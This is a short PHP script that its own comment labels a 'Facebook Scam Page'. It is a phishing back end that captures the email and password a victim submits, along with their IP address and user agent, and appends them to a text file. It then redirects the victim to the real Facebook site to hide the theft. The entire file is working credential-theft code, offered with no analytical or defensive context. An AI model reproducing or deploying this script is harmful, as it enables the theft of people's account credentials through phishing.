<?php


	#Facebook Scam Page _ as of 25/05/17
	
	$ip = $_SERVER['REMOTE_ADDR'];
	
	$email = $_POST['email'];
	
	$pass = $_POST['pass'];
	
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	
	if(strlen($email)>3&&strlen($email)<50)
		if(strlen($pass)>3&&strlen($pass)<50)
	file_put_contents("tigari.txt", $email . ":" . $pass . ":"  . $ip  . ":" . $useragent . PHP_EOL, FILE_APPEND);

	header('Location: https://www.facebook.com/');
	
?>